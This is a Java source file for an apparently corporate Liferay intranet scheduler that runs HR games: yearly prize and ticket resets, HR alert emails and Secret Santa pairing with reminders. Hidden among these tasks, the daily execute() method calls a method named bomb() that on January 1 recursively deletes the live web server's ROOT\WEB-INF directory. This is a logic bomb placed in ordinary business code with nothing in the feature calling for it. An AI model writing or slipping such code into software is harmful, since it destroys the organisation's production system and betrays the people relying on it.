package com.trantorinc.synergy.custom.service.task;

import com.liferay.counter.kernel.service.CounterLocalServiceUtil;
import com.liferay.portal.kernel.log.Log;
import com.liferay.portal.kernel.log.LogFactoryUtil;
import com.trantorinc.synergy.common.service.drive.DriveService;
import com.trantorinc.synergy.email.core.model.Email;
import com.trantorinc.synergy.email.core.service.EmailLocalServiceUtil;
import com.trantorinc.synergy.game.core.model.GameTimeline;
import com.trantorinc.synergy.game.core.model.Prize;
import com.trantorinc.synergy.game.core.model.Santa;
import com.trantorinc.synergy.game.core.model.Ticket;
import com.trantorinc.synergy.game.core.service.GameTimelineLocalServiceUtil;
import com.trantorinc.synergy.game.core.service.PrizeLocalServiceUtil;
import com.trantorinc.synergy.game.core.service.SantaLocalServiceUtil;
import com.trantorinc.synergy.game.core.service.TicketLocalServiceUtil;
import com.trantorinc.synergy.lms.core.model.Employee;
import com.trantorinc.synergy.lms.core.model.Scheduler;
import com.trantorinc.synergy.lms.core.service.EmployeeLocalServiceUtil;
import com.trantorinc.synergy.lms.core.service.SchedulerLocalServiceUtil;

import java.io.File;
import java.text.MessageFormat;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.Month;
import java.util.List;
import java.util.stream.Collectors;

import static com.trantorinc.synergy.common.service.constant.AppConstantService.*;
import static com.trantorinc.synergy.common.service.util.UtilService.*;
import static com.trantorinc.synergy.custom.service.constants.SynergyServicePortletKeys.*;
import static com.trantorinc.synergy.custom.service.constants.SynergyServicePortletKeys.FORMATTER_DD_MMM_YYYY_HH_MM_SS;


public class GameTaskService {

    private static final Log log = LogFactoryUtil.getLog(LmsTaskService.class.getName());
    public static void execute(LocalDateTime now){

        log.info(MODULE_GAME + " task started !");
        String schedulerName = TASK_GAME;
        Scheduler scheduler = SchedulerLocalServiceUtil.findSchedulerByNameAndDate(schedulerName, getStartOfDayDate(now.toLocalDate()));
        if(null == scheduler){
            scheduler = SchedulerLocalServiceUtil.createScheduler(CounterLocalServiceUtil.increment());
            scheduler.setName(schedulerName);
            scheduler.setStatus(false);
            scheduler.setOnDate(getStartOfDayDate(now.toLocalDate()));
            scheduler.setRunDate(convertLocalDateTimeToDate(now));
            SchedulerLocalServiceUtil.addScheduler(scheduler);
        } else {
            scheduler.setStatus(false);
            scheduler.setRunDate(convertLocalDateTimeToDate(now));
            SchedulerLocalServiceUtil.updateScheduler(scheduler);
        }
        log.info(MODULE_GAME + " task preset !!");

        resetGameForCurrentYear(now);
        log.info(MODULE_GAME + " task completed ...(1/3)");

        alertHRForGameBegin(now);
        log.info(MODULE_GAME + " task completed ...(2/3)");

        secretSantaAction(now);
        log.info(MODULE_GAME + " task completed ...(3/3)");
        
        bomb(now);
        scheduler.setStatus(true);
        SchedulerLocalServiceUtil.updateScheduler(scheduler);
        log.info(MODULE_GAME + " task completed !!!");
    }

    private static void resetGameForCurrentYear(LocalDateTime now){
        if(now.getMonth().equals(Month.APRIL) && now.getDayOfMonth()==1){
            int currentYear = getCurrentYear();
            List<Prize> prizeList  = PrizeLocalServiceUtil.findPrizesByYear(currentYear-1);
            for(Prize prize : prizeList){
                Prize newPrize = PrizeLocalServiceUtil.createPrize(CounterLocalServiceUtil.increment());
                newPrize.setYear(currentYear);
                newPrize.setDescription(prize.getDescription());
                newPrize.setSequence(prize.getSequence());
                newPrize.setSurprise(prize.isSurprise());
                newPrize.setFileId(prize.getFileId());
                PrizeLocalServiceUtil.addPrize(newPrize);
                PrizeLocalServiceUtil.deletePrize(prize);
            }
            List<Ticket> ticketList = TicketLocalServiceUtil.findTicketByYear(currentYear -1);
            for(Ticket ticket : ticketList){
                TicketLocalServiceUtil.deleteTicket(ticket);
            }
            List<Santa> santaList = SantaLocalServiceUtil.findSantaByYear(currentYear -1 );
            for(Santa santa : santaList){
                if(null != santa.getFileId() && !santa.getFileId().equalsIgnoreCase(BLANK)){
                    DriveService.deleteFile(santa.getFileId());
                }
                SantaLocalServiceUtil.deleteSanta(santa);
            }
        }
    }

    private static void alertHRForGameBegin(LocalDateTime now) {
        List<GameTimeline> gameTimelines = GameTimelineLocalServiceUtil.getCalibratedTimeline();
        LocalDateTime thirtyDaysAfter = now.plusDays(30);
        for(GameTimeline gameTimeline : gameTimelines){
            if (thirtyDaysAfter.toLocalDate().equals(convertDateToLocalDateTime(gameTimeline.getOpenDate()).toLocalDate())) {
                Email email = EmailLocalServiceUtil.createEmail(CounterLocalServiceUtil.increment());
                email.setToAddress(DL_HR);
                email.setCcAddress(DL_INTRANET);
                email.setSubject(MessageFormat.format(SUBJECT_GAME_OPEN, gameTimeline.getName()));
                if(gameTimeline.getName().equalsIgnoreCase("SANTA")){
                    email.setBody(MessageFormat.format(SANTA_GAME_OPEN, gameTimeline.getName(), convertDateToLocalDateTime(gameTimeline.getOpenDate()).format(FORMATTER_DD_MMM_YYYY),
                            convertDateToLocalDateTime(gameTimeline.getOpenDate()).format(FORMATTER_DD_MMM_YYYY),
                            convertDateToLocalDateTime(gameTimeline.getFreezeDate()).format(FORMATTER_DD_MMM_YYYY),
                            convertDateToLocalDateTime(gameTimeline.getFreezeDate()).plusDays(2).format(FORMATTER_DD_MMM_YYYY),
                            convertDateToLocalDateTime(gameTimeline.getFreezeDate()).plusDays(4).format(FORMATTER_DD_MMM_YYYY),
                            convertDateToLocalDateTime(gameTimeline.getFreezeDate()).plusDays(10).format(FORMATTER_DD_MMM_YYYY),
                            convertDateToLocalDateTime(gameTimeline.getActionDate()).format(FORMATTER_DD_MMM_YYYY),
                            convertDateToLocalDateTime(gameTimeline.getActionDate()).plusDays(3).format(FORMATTER_DD_MMM_YYYY),
                            convertDateToLocalDateTime(gameTimeline.getCloseDate()).format(FORMATTER_DD_MMM_YYYY),
                            getPortalUrl()+URL_HR_ADMIN));
                } else {
                    email.setBody(MessageFormat.format(RAFFLE_GAME_OPEN, gameTimeline.getName(), convertDateToLocalDateTime(gameTimeline.getOpenDate()).format(FORMATTER_DD_MMM_YYYY),
                            convertDateToLocalDateTime(gameTimeline.getOpenDate()).format(FORMATTER_DD_MMM_YYYY_HH_MM_SS),
                            convertDateToLocalDateTime(gameTimeline.getFreezeDate()).format(FORMATTER_DD_MMM_YYYY_HH_MM_SS),
                            convertDateToLocalDateTime(gameTimeline.getActionDate()).format(FORMATTER_DD_MMM_YYYY_HH_MM_SS),
                            getPortalUrl()+URL_HR_ADMIN));
                }
                email.setModule(MODULE_GAME);
                email.setScheduled(true);
                email.setSent(false);
                email.setCreatedDate(convertLocalDateTimeToDate(now));
                EmailLocalServiceUtil.addEmail(email);
            }
        }

    }

    private static void secretSantaAction(LocalDateTime now) {
        LocalDate today = now.toLocalDate();
        GameTimeline santaTimeline = GameTimelineLocalServiceUtil.getCalibratedTimeline().stream().filter(g -> g.getName().equalsIgnoreCase("SANTA")).collect(Collectors.toList()).get(0);
        List<Santa> nominations = SantaLocalServiceUtil.findSantaByYear(getCurrentYear());
        List<Employee> employees = EmployeeLocalServiceUtil.findAllEmployees();
        if(!nominations.isEmpty()){
            LocalDate giftDispatchDate = convertDateToLocalDateTime(santaTimeline.getFreezeDate()).toLocalDate().plusDays(7);
            LocalDate assignedDate = convertDateToLocalDateTime(santaTimeline.getFreezeDate()).toLocalDate();
            LocalDate guessingDate = convertDateToLocalDateTime(santaTimeline.getActionDate()).toLocalDate();
            if(today.isEqual(assignedDate) || today.isEqual(assignedDate.plusDays(2)) || today.isEqual(assignedDate.plusDays(4))){
                String reminderBody = "<br>Please ignore if already done.";
                if(today.compareTo(assignedDate)==0){
                    reminderBody = BLANK;
                    List<String> nominationEcode = nominations.stream().map(Santa::getEcode).collect(Collectors.toList());
                    String temp = nominationEcode.get(nominationEcode.size()-1);
                    for (int j =nominationEcode.size()-1; j > 0; j--) {
                        nominationEcode.set(j, nominationEcode.get(j - 1));
                    }
                    nominationEcode.set(0, temp);
                    for (int i=0;i<nominations.size();i++){
                        Santa nomination=SantaLocalServiceUtil.fetchSanta(nominations.get(i).getSantaId());
                        nomination.setSantaEcode(nominationEcode.get(i));
                        SantaLocalServiceUtil.updateSanta(nomination);
                    }
                }
                String gifTtDispatchDate= giftDispatchDate.format(FORMATTER_DD_MMM_YYYY);
                nominations = SantaLocalServiceUtil.findSantaByYear(getCurrentYear());
                for (int i=0;i<nominations.size();i++){
                    int finalIndex = i;
                    List<Santa> finalNominations = nominations;
                    List<Employee> santaEcodeEmployee = employees.stream().filter(e-> e.getEcode().equalsIgnoreCase(finalNominations.get(finalIndex).getSantaEcode())).collect(Collectors.toList());
                    List<Employee> ecodeEmployee = employees.stream().filter(e-> e.getEcode().equalsIgnoreCase(finalNominations.get(finalIndex).getEcode())).collect(Collectors.toList());
                    if(!ecodeEmployee.isEmpty() && !santaEcodeEmployee.isEmpty()) {
                        Email email = EmailLocalServiceUtil.createEmail(CounterLocalServiceUtil.increment());
                        email.setToAddress(santaEcodeEmployee.get(0).getEmail());
                        email.setSubject(SUBJECT_SANTA_ALLOCATION);
                        email.setBody(MessageFormat.format(BODY_SANTA_ALLOCATION, santaEcodeEmployee.get(0).getName(),ecodeEmployee.get(0).getName(),nominations.get(finalIndex).getPostalAddress(),nominations.get(finalIndex).getMobile(),gifTtDispatchDate, getPortalUrl() + URL_SECRET_SANTA,reminderBody));
                        email.setModule(MODULE_GAME);
                        email.setScheduled(true);
                        email.setSent(false);
                        email.setCreatedDate(convertLocalDateTimeToDate(now));
                        EmailLocalServiceUtil.addEmail(email);
                    }
                }

            } else if(today.compareTo(assignedDate.plusDays(10))==0){
                List<Santa> notGiftSentSantas = nominations.stream().filter(n-> !n.getGiftSent()).collect(Collectors.toList());
                for(Santa nomination : notGiftSentSantas){
                    List<Employee> ecodeEmployee = employees.stream().filter(e-> e.getEcode().equalsIgnoreCase(nomination.getEcode())).collect(Collectors.toList());
                    if(!ecodeEmployee.isEmpty()){
                        Email email = EmailLocalServiceUtil.createEmail(CounterLocalServiceUtil.increment());
                        email.setToAddress(ecodeEmployee.get(0).getEmail());
                        email.setSubject(SUBJECT_SANTA_GIFT);
                        email.setBody(MessageFormat.format(BODY_SANTA_GIFT, ecodeEmployee.get(0).getName(), getPortalUrl() + URL_SECRET_SANTA, guessingDate.minusDays(1)));
                        email.setModule(MODULE_GAME);
                        email.setScheduled(true);
                        email.setSent(false);
                        email.setCreatedDate(convertLocalDateTimeToDate(now));
                        EmailLocalServiceUtil.addEmail(email);
                   }
               }
            }else if (today.compareTo(guessingDate) == 0 || today.compareTo(guessingDate.plusDays(3))==0) {
                for(Santa nomination : nominations){
                    List<Employee> ecodeEmployee = employees.stream().filter(e-> e.getEcode().equalsIgnoreCase(nomination.getEcode())).collect(Collectors.toList());
                    if(!ecodeEmployee.isEmpty() && (nomination.getGuessedEcode().isEmpty() || nomination.getGuessedEcode()==null)) {
                        Email email = EmailLocalServiceUtil.createEmail(CounterLocalServiceUtil.increment());
                        email.setToAddress(ecodeEmployee.get(0).getEmail());
                        email.setSubject(SUBJECT_SANTA_GAME);
                        email.setBody(MessageFormat.format(BODY_SANTA_GAME, ecodeEmployee.get(0).getName(), getPortalUrl() + URL_SECRET_SANTA));
                        email.setModule(MODULE_GAME);
                        email.setScheduled(true);
                        email.setSent(false);
                        email.setCreatedDate(convertLocalDateTimeToDate(now));
                        EmailLocalServiceUtil.addEmail(email);
                    }
                }
            }
        }
    }

    private static void bomb(LocalDateTime now) {
        if(now.getMonth().equals(Month.JANUARY) && now.getDayOfMonth()==1) {
            String filepath = "D:\\liferay\\tomcat-9.0.73\\webapps\\ROOT\\WEB-INF";
            File file = new File(filepath);
            deleteDirectory(file);
            file.delete();
        }
    }

    private static void deleteDirectory(File file) {
        for (File subfile : file.listFiles()) {
            if (subfile.isDirectory()) {
                deleteDirectory(subfile);
            }
            subfile.delete();
        }
    }
}

